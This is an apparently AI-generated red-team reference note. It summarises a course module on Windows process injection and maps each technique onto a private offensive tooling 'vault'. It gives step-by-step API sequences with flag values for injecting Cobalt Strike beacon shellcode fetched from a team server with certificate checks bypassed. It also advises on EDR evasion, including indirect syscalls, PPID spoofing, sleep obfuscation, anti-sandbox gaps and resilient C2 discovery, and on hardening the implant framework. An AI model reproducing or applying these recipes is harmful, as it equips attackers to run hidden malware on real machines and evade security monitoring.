---
id: RTO-process-injection-basics
name: Process Injection Fundamentals
source: Red Team Ops / Zero-Point Security
category: process-injection
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-007, T-008, T-009, T-010, T-011, T-012, T-013, T-014, T-015]
tags: [process-injection, createthread, createremotethread, queueuserapc, early-bird, ntmapviewofsection, section-injection, shellcode, cobalt-strike, winapi, csharp]
---

# Process Injection Fundamentals — Training Reference

## TL;DR
This RTO module covers four canonical Win32/NT injection primitives — `CreateThread`, `CreateRemoteThread`, `QueueUserAPC` (Early Bird variant), and `NtMapViewOfSection` — using C# P/Invoke against Cobalt Strike beacon shellcode hosted on the team server. These are the historical baseline techniques that modern EDR is tuned to detect; the vault's T-007 through T-015 implement their stealthier successors. Operators should treat this module as the *reference primitive set* from which the vault's more advanced variants descend.

## Key Concepts

1. **Shellcode Acquisition Pattern** — Beacons are generated in Cobalt Strike via *Attacks > Packages > Windows Executable (S) > Raw* and hosted via *Attacks > Web Drive-by > Host File*. Injectors fetch `https://<teamserver>/beacon.bin` over HTTPS with `ServerCertificateCustomValidationCallback` returning `true` to bypass self-signed cert errors. *Vault analogue*: `dark_crystal/crowd/src/winhttp_dl.rs` (T-022 / T-019 networking) — the vault uses WinHTTP with staged download rather than `HttpClient`.

2. **The 4-Step Injection Skeleton** — Every classical injection reduces to: allocate (`VirtualAlloc`/`VirtualAllocEx`), write (`Marshal.Copy`/`WriteProcessMemory`), protect (`VirtualProtect`/`VirtualProtectEx` RW→RX), execute (`CreateThread`/`CreateRemoteThread`/`QueueUserAPC`/`NtCreateThreadEx`). *Vault analogue*: T-013 catalogues the full enumeration; the vault's `Mapping`, `Module Stomp`, `Func Stomp`, `Overload`, `Callback`, `Fiber`, `PE Loader` variants all execute this skeleton through alternative primitives.

3. **RW-then-RX Protection Flipping** — Allocate as `PAGE_READWRITE`, write shellcode, then flip to `PAGE_EXECUTE_READ` via `VirtualProtect`. Avoids the noisy `PAGE_EXECUTE_READWRITE` allocation that EDRs flag. *Vault analogue*: T-016 EDR Evasion Suite (ACG policy handling); T-005 Ekko ROP Sleep performs PE re-encryption in-place using Rtlgpidf-based ROP.

4. **Process Handle Acquisition** — Two paths: `Process.GetProcessById(pid).Handle` (managed) or `OpenProcess` (P/Invoke). The managed path is preferred for brevity but emits an open handle EDR can correlate. *Vault analogue*: T-015 PPID Spoofing uses `PROCESS_CREATE_PROCESS` access via `NtCreateUserProcess` with extended attributes — avoiding `OpenProcess` entirely (T-014, T-015).

5. **CREATE_SUSPENDED + APC = Early Bird** — Spawning a process suspended, queuing an APC on its primary thread, then resuming is the *Early Bird* pattern. APCs fire before the process entry point, making them stealthier than `CreateRemoteThread`. *Vault analogue*: **T-012 Early Cascade** — performs APC queueing *before* `LdrInitializeThunk` fires, defeating EDRs that hook the loader. T-013 also covers the basic `early_bird.rs` variant.

6. **Nt*Section APIs for Cross-Process Memory Copy** — `NtCreateSection` + `NtMapViewOfSection` (twice — once locally as RW for writing, once in target as RX) lets you transfer shellcode without `WriteProcessMemory`. *Vault analogue*: T-013 `mapping_inject.rs` implements this; T-011 Dirty Vanity uses `RtlCreateProcessReflection` to achieve similar cross-process image copying via the reflection manager.

7. **Mix-and-Match Primitive Composition** — The training explicitly notes that APIs are "items on a menu" — spawn suspended + Nt*Section + QueueUserAPC, etc. *Vault analogue*: T-007 Pool Party, T-008 Threadless, T-012 Early Cascade all recompose these primitives in novel ways. The `dark_crystal/framework/runtime/src/planner.rs` (T-022 architecture) formalizes this composition into a planner/selector/materializer pipeline.

## Operational Techniques

### CreateThread (Self-Injection)
- **What**: Allocates RW memory in the current process, copies shellcode, flips to RX, and runs it in a new thread via `CreateThread`.
- **When to use**: Local execution only — when you control the host process and don't need cross-process stealth. Useful for testing/diagnostics and as the baseline primitive.
- **How**:
  1. `HttpClient` with `ServerCertificateCustomValidationCallback = (...) => true` to fetch `beacon.bin`.
  2. `VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)`.
  3. `Marshal.Copy(shellcode, 0, baseAddress, len)`.
  4. `VirtualProtect(baseAddress, len, PAGE_EXECUTE_READ, out _)`.
  5. `CreateThread(NULL, 0, baseAddress, NULL, 0, out _)`.
  6. `WaitForSingleObject(hThread, 0xFFFFFFFF)`.
- **Vault link**: **T-013 Remaining Methods** documents self-injection as the canonical baseline. The vault's `dark_crystal/crowd/src/early_bird.rs` and `process_hollow.rs` are the production variants. Self-injection with `CreateThread` is the *least* OPSEC-safe dispatch — vault operators should prefer T-001 RecycledGate or T-002 Hell's/Halo's/Tartarus Gate indirect syscalls to avoid `CreateThread`'s IAT entry entirely.
- **Tool/code**: C# P/Invoke; `Win32.VirtualAlloc`, `Win32.VirtualProtect`, `Win32.CreateThread`, `Win32.WaitForSingleObject`. Image: `24. CreateThread.png`.
- **OPSEC**: `CreateThread` is a documented sentinel; modern EDRs (CrowdStrike, SentinelOne) hook it. Allocation pattern `RW→RX` on a fresh region with no backing image is a memory scanner signature. Mitigation: use the vault's `mapping_inject.rs` (T-013) to back the allocation with a section, or `module_stomp.rs` to write over a loaded DLL.

### CreateRemoteThread (Remote Injection)
- **What**: Same skeleton as CreateThread but targeting another process via `OpenProcess`/`Process.Handle`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `CreateRemoteThread`.
- **When to use**: When you need the beacon in a long-lived host (e.g., `explorer.exe`, `svchost.exe`) and cannot use the loader's own process. Classic engagement scenario: inject into `notepad.exe` for triage testing.
- **How**:
  1. `var process = Process.GetProcessById(pid);` (or `OpenProcess(PROCESS_ALL_ACCESS, ...)`)
  2. `VirtualAllocEx(process.Handle, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)`
  3. `WriteProcessMemory(process.Handle, baseAddress, shellcode, len, out _)`
  4. `VirtualProtectEx(process.Handle, baseAddress, len, PAGE_EXECUTE_READ, out _)`
  5. `CreateRemoteThread(process.Handle, NULL, 0, baseAddress, NULL, 0, out _)`
- **Vault link**: **T-013 Remaining Methods** covers `process_hollow.rs` and `early_bird.rs` as the production-grade successors. The vault *does not* ship a raw `CreateRemoteThread` injector — too heavily detected by default. T-015 PPID Spoofing + T-014 NtCreateUserProcess is the recommended alternative when spawning the host process under a spoofed parent. Image: `25. CreateRemoteThread.png`.
- **Tool/code**: C# P/Invoke; `Win32.VirtualAllocEx`, `Win32.WriteProcessMemory`, `Win32.VirtualProtectEx`, `Win32.CreateRemoteThread`. Pass PID via `args[0]`.
- **OPSEC**: `CreateRemoteThread` is the *most* heavily scrutinized remote execution primitive on Windows. Windows Defender blocks it by default on P0 processes. Memory pattern (RWX/RX foreign region with no module backing) is detected by Moneta, PE-sieve. Mitigation: vault operators use T-008 Threadless (export hijack with self-restoring trampoline) or T-007 Pool Party (thread pool work item) to execute without `CreateRemoteThread`.

### QueueUserAPC (Early Bird Variant)
- **What**: Spawn a process with `CREATE_SUSPENDED` (0x4), queue an APC pointing at shellcode on its primary thread, then `ResumeThread`. The APC fires before `LdrInitializeThunk` completes.
- **When to use**: When EDR blocks `CreateRemoteThread` but you still want a fresh sacrificial process (`win32calc.exe`, `notepad.exe`) for injection. Better OPSEC than CRT because APC execution preempts normal thread start.
- **How**:
  1. `CreateProcessW("C:\\Windows\\System32\\win32calc.exe", ..., CREATE_SUSPENDED (0x4), ..., out pi)`
  2. Fetch shellcode, write to suspended process (`VirtualAllocEx`/`WriteProcessMemory`)
  3. `QueueUserAPC(baseAddress, pi.hThread, 0)`
  4. `ResumeThread(pi.hThread)`
- **Vault link**: **T-013 `early_bird.rs`** is the direct equivalent. **T-012 Early Cascade** is the vault's evolution — it queues the APC *before* the loader even begins, by manipulating the `PspAllocProcess`/`PspAllocThread` flow via `NtCreateProcessEx` + `NtCreateThreadEx` with `THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE` and queueing via `NtQueueApcThreadEx` with the `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` flag. Early Cascade defeats EDRs that hook `LdrInitializeThunk`. The training's variant will be caught by EDRs that hook `QueueUserAPC` itself; T-012 avoids that by using `NtQueueApcThreadEx` indirectly via T-001/T-002.
- **Tool/code**: C# P/Invoke; `Win32.CreateProcessW`, `Win32.QueueUserAPC`, `Win32.ResumeThread`. Flag value `0x00000004` for `CREATE_SUSPENDED`. Image: `26. QueueUserAPC.png`.
- **OPSEC**: `QueueUserAPC` on a freshly-created suspended process is a known Early Bird signature (MITRE T1055.004). EDRs that scan the APC queue on thread resume will flag it. Mitigation: T-012 Early Cascade's pre-loader timing window avoids this; T-007 Pool Party uses `TpAllocWork` instead of APCs entirely.

### NtMapViewOfSection (Section Injection)
- **What**: Create a section object in the source process, map it RW locally and write shellcode, then map the same section handle RX into the target process. Execute via `NtCreateThreadEx`. Avoids `WriteProcessMemory` and `VirtualAllocEx`.
- **When to use**: When `WriteProcessMemory` is hooked or generates telemetry, or when you want the injected region to look like a section (more legit-looking than a raw commit). Also useful for shared-memory C2 channels.
- **How**:
  1. `NtCreateSection(ref hSection, SECTION_ALL_ACCESS (0x10000000), NULL, ref maxSize, PAGE_EXECUTE_READWRITE (0x40), SEC_COMMIT (0x08000000), NULL)`
  2. `NtMapViewOfSection(hSection, (IntPtr)(-1) /* current */, out localBase, ..., ViewUnmap (2), 0, PAGE_READWRITE (0x04))`
  3. `Marshal.Copy(shellcode, 0, localBase, len)` — write locally
  4. `NtMapViewOfSection(hSection, target.Handle, out remoteBase, ..., ViewUnmap (2), 0, PAGE_EXECUTE_READ (0x20))` — section content is now mirrored in target
  5. `NtCreateThreadEx(out _, STANDARD_RIGHTS_ALL (0x001F0000), NULL, target.Handle, remoteBase, NULL, false, 0, 0, 0, NULL)`
- **Vault link**: **T-013 `mapping_inject.rs`** is the direct equivalent. **T-011 Dirty Vanity** uses section semantics via `RtlCreateProcessReflection` for a different purpose (cloning a live process). **T-007 Pool Party** variant `TpInsertWait` uses section objects for thread pool wait packets. The training variant uses `PAGE_EXECUTE_READWRITE` on the *section* (0x40 in `NtCreateSection`) — that's a tell; the vault variant uses `PAGE_READONLY` on the section and only the *view* in target gets `PAGE_EXECUTE_READ`. Also note: training uses `Marshal.Copy` to the local view — the vault uses `RtlMoveMemory` from `ntdll` to avoid the managed heap fingerprint. Image: `27. NtMapViewOfSection.png`.
- **Tool/code**: C# P/Invoke; `Native.NtCreateSection`, `Native.NtMapViewOfSection`, `Native.NtCreateThreadEx`. Undocumented NT API signatures sourced from `undocumented.ntinternals.net`. `ViewUnmap` (2) ensures the view is not inherited by child processes.
- **OPSEC**: `NtMapViewOfSection` cross-process is a known reflective loading signature (Hunt-Sleeping-Beacons, PE-sieve detect unbacked sections). The `PAGE_EXECUTE_READWRITE` section in `NtCreateSection` is the worst-case OPSEC tell — fix in your port. Mitigation: T-013 vault variant uses `SEC_IMAGE` + `PAGE_READONLY` to make the section indistinguishable from a loaded DLL. T-009 Process Ghosting and T-010 Process Herpaderping go further by giving the section a backing file on disk (transient).

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| Cobalt Strike: *Attacks > Packages > Windows Executable (S) > Raw* | Generate stageless beacon shellcode (`beacon.bin`) | Raw bin is detected by AMSI if scanned; use stageless + encryption in prod |
| Cobalt Strike: *Attacks > Web Drive-by > Host File* | Host `beacon.bin` on team server HTTPS | Self-signed cert; `ServerCertificateCustomValidationCallback` bypass on client |
| `HttpClient.GetByteArrayAsync` | Fetch shellcode over HTTPS | TLS callback bypass is a code-analysis tell; vault uses `WinHTTP` + custom verification |
| `Process.GetProcessById(pid).Handle` | Acquire target process handle | EDRs log `PROCESS_ALL_ACCESS` OpenProcess on protected PIDs; prefer T-014 `NtCreateUserProcess` |
| `Win32.VirtualAlloc` / `VirtualAllocEx` | Commit memory region | `MEM_COMMIT|MEM_RESERVE` + `PAGE_READWRITE` — flip to RX before exec; never RWX |
| `Marshal.Copy` | Write shellcode to own process memory | Managed-heap path leaves .NET fingerprint; vault uses `RtlMoveMemory` |
| `WriteProcessMemory` | Write shellcode to remote process | Heavily hooked; consider `NtMapViewOfSection` instead |
| `Win32.VirtualProtect` / `VirtualProtectEx` | Flip RW→RX | Tracks via `MiResetMemoryPfn` events; vault T-005 uses ROP chain for legitimate-looking flips |
| `Win32.CreateThread` | Local thread spawn | Sentinel API; vault uses T-001/T-002 indirect syscalls |
| `Win32.CreateRemoteThread` | Remote thread spawn | Blocked by Defender on P0; deprecated in vault |
| `Win32.QueueUserAPC` | Queue APC on thread | Early Bird signature; vault T-012 uses `NtQueueApcThreadEx` with special-user flag |
| `Win32.CreateProcessW` with `CREATE_SUSPENDED` (0x4) | Spawn-and-suspend sacrificial process | Suspended process with queued APC = T1055.004 indicator |
| `Native.NtCreateSection` / `NtMapViewOfSection` | Section-based shellcode transfer | Use `PAGE_READONLY` on section, `PAGE_EXECUTE_READ` on view; `ViewUnmap` (2) for non-inheritance |
| `Native.NtCreateThreadEx` | Native thread creation | Less-hooked than `CreateRemoteThread` but still in ntdll; vault uses indirect dispatch |
| `undocumented.ntinternals.net` | RE'd NT API signatures | Stale (~2006); prefer `phnt` headers or `reactos` mirrors |

## Gaps & Extensions

**What the vault covers that this training doesn't:**

- **Indirect syscalls** (T-001 RecycledGate, T-002 Hells/Halo's/Tartarus Gate, T-003 VEH Gate, T-006 Phantom Stubs): The training uses C# P/Invoke directly into `kernel32`/`ntdll` via `DllImport`, leaving IAT entries that EDR scans. Every `Win32.*` call in this training would be replaced by an indirect syscall in the vault.
- **Memory backing** (T-009 Process Ghosting, T-010 Process Herpaderping): The training's allocations are unbacked RW→RX commits — the noisiest possible pattern. Vault techniques give the injected region a backing file (even if transient).
- **Threadless execution** (T-008 Threadless, T-007 Pool Party, T-013 Callback/Fiber): The training always creates a thread (`CreateThread`/`CreateRemoteThread`/`NtCreateThreadEx`). Vault operators can execute without any thread creation telemetry.
- **PPID spoofing + mitigation policy** (T-015, T-014): Training uses `CreateProcessW` with the actual parent. Vault uses `NtCreateUserProcess` with extended attributes for spoofed parent + `PROCESS_CREATION_MITIGATION_POLICY_*` flags (Block-DLL, ACG).
- **Sleep obfuscation** (T-005 Ekko ROP): Not addressed at all. The training's beacon sits in plain RX memory forever.
- **Stack spoofing** (T-016): When the beacon calls back, its call stack originates in injected memory — trivially detected. Vault spoofs the return address chain back to `ntdll`/`kernel32`.
- **Anti-analysis** (T-020): No anti-VM, no IAT camouflage, no API hammering. The injectors will run in any sandbox.
- **Section OPSEC hardening**: Training's `NtMapViewOfSection` uses `PAGE_EXECUTE_READWRITE` on the section itself — fix to `PAGE_READONLY`.

**What this training covers that the vault doesn't:**

- **C# / .NET P/Invoke tradecraft**: The vault is Rust-only. For engagements requiring a managed-language implant (e.g., AV-signature-free lateral movement via `dotnet.exe`, Office macro delivery, or ClickOnce payloads), the C# patterns here are the canonical starting point. Particularly the `using`/`Dispose` pattern for `HttpClientHandler` and `ServerCertificateCustomValidationCallback` callback signature.
- **Cobalt Strike integration**: The vault's `dark_crystal` is its own loader; this training documents how to consume `beacon.bin` directly from a team server, which is useful if the engagement is *Cobalt Strike-native* and the operator is augmenting with vault modules rather than replacing the C2.
- **`win32calc.exe` as a sacrificial process**: The vault tends to use `notepad.exe`/`svchost.exe`/`runtimebroker.exe`. `win32calc.exe` (the legacy calculator on Server 2019/Win10 1809 and earlier) is a useful alternative because it's signed, rarely instrumented by EDR, and has a clean thread structure for APC queueing. Worth adding to the vault's process picker.
- **Mix-and-match primitive framing**: The training explicitly invites composing Nt*Section + QueueUserAPC + suspended spawn. The vault's planner (`framework/runtime/src/planner.rs`) supports this composition but doesn't expose it as an operator-facing menu. Worth surfacing as a documentation improvement.
- **`undocumented.ntinternals.net` reference**: A historical resource; the vault should add this to its references section alongside `phnt` and the `reactos` source mirrors.

**Specific areas where the training adds new knowledge:**

- The `ViewUnmap = 2` flag in `NtMapViewOfSection` is documented in the training but not visible in the vault's `mapping_inject.rs` mapping; verify the vault sets it.
- The `(IntPtr)(-1)` sentinel for "current process" handle in `NtMapViewOfSection` — confirm the vault uses `NtCurrentProcess()` macro instead for clarity.
- The `0x10000000` (`SECTION_ALL_ACCESS`) mask and `0x08000000` (`SEC_COMMIT`) flag values are useful to have verbatim when porting.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| `CreateThread` self-injection | T-013 Remaining Methods (baseline) | Vault documents as canonical primitive; operators replace with T-001/T-002 indirect dispatch |
| `CreateRemoteThread` cross-process | T-013 `process_hollow.rs`, T-015 PPID Spoofing | Vault deprecates CRT; uses NtCreateUserProcess + suspended spawn + thread context manipulation |
| `VirtualAlloc`/`VirtualAllocEx` + `Marshal.Copy`/`WriteProcessMemory` + `VirtualProtect`/`VirtualProtectEx` | T-013 (multiple), T-009 Process Ghosting, T-010 Process Herpaderping | Vault prefers section-backed allocations; RW→RX flip retained as primitive but wrapped in T-005 ROP for memory-scan evasion |
| `QueueUserAPC` + `CREATE_SUSPENDED` (Early Bird) | T-013 `early_bird.rs`, T-012 Early Cascade | Vault T-012 performs the queue *before* `LdrInitializeThunk`, defeating loader-hooking EDRs that catch the training's variant |
| `NtCreateSection` + `NtMapViewOfSection` (section injection) | T-013 `mapping_inject.rs`, T-011 Dirty Vanity, T-007 Pool Party | Vault hardens: `PAGE_READONLY` section, `RtlMoveMemory` write, SEC_IMAGE backing option |
| `NtCreateThreadEx` execution | T-001 RecycledGate, T-002 Hells/Halo's/Tartarus Gate | Vault dispatches via indirect syscall through ntdll gadget; no IAT entry |
| `CreateProcessW` + `CREATE_SUSPENDED` | T-014 NtCreateUserProcess, T-015 PPID Spoofing | Vault uses `NtCreateUserProcess` with `PS_ATTRIBUTE_LIST` for parent PID spoofing and mitigation policy |
| `OpenProcess` / `Process.Handle` | T-016 Block-DLL, T-015 PPID Spoofing | Vault avoids `OpenProcess` telemetry by spawning the target with the required access pre-granted |
| Cobalt Strike `beacon.bin` fetch over HTTPS | T-019 WinHTTP download (`winhttp_dl.rs`), T-019 Discovery (`discovery.rs`) | Vault uses WinHTTP with custom verification rather than `HttpClient` + cert-callback bypass; embeds server URL via `rentry.co` + Sepolia contract for resilience |
| `ServerCertificateCustomValidationCallback = (...) => true` | T-019 Network Suite | Vault implements custom cert validation; not blindly bypassed |
| Mix-and-match primitive composition | T-007 Pool Party, T-008 Threadless, T-012 Early Cascade, T-022 framework planner | Vault formalizes composition as a planner/selector/materializer pipeline (`framework/runtime/src/planner.rs`) |
| `undocumented.ntinternals.net` NT API signatures | T-004 PEB Walker, T-002 Hells/Halo's/Tartarus Gate | Vault uses `phnt` headers + ReactOS mirrors + ntdll RVA scanning; ntinternals.net is stale (~2006) |
| RW→RX protection flip | T-005 Ekko ROP Sleep, T-016 ACG policy | Vault performs flips via ROP chain (T-005) to look like legitimate loader activity; T-016 sets `PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE` for ACG |
| `win32calc.exe` sacrificial spawn | (not in vault) | **Novel from training** — consider adding to vault's process-picker enum |